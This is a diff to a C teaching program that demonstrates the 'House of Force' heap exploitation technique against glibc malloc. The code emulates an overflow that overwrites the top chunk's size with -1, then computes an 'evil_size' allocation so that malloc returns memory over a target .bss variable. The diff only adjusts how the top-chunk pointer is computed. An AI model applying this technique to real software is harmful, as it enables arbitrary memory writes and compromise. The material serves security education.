@@ -37,25 +37,25 @@ int main(int argc , char* argv[])
 
 	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
 	int real_size = malloc_usable_size(p1);
-	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %d.\n", real_size);
+	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %d.\n", real_size + sizeof(long)*2);
 
 	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
 
 	//----- VULNERABILITY ----
-	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
-	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top - sizeof(long));
+	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
+	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
 
 	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
-	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
-	ptr_top[0] = -1;
-	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
+	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
 	//------------------------
 
 	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
 	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
 	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");
 
-	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - ((unsigned long)ptr_top - sizeof(long));
+	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
 	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
 	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
 	void *new_ptr = malloc(evil_size);
